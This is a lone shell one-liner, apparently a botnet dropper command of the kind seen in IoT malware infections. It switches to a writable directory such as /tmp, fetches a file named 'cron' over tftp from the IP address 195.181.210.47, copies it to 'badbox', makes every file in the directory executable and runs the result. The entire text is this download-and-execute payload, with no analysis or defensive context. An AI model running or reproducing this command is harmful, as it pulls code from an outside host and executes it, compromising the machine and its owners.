cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 195.181.210.47 -c get cron;cat cron >badbox;chmod +x *;./badbox
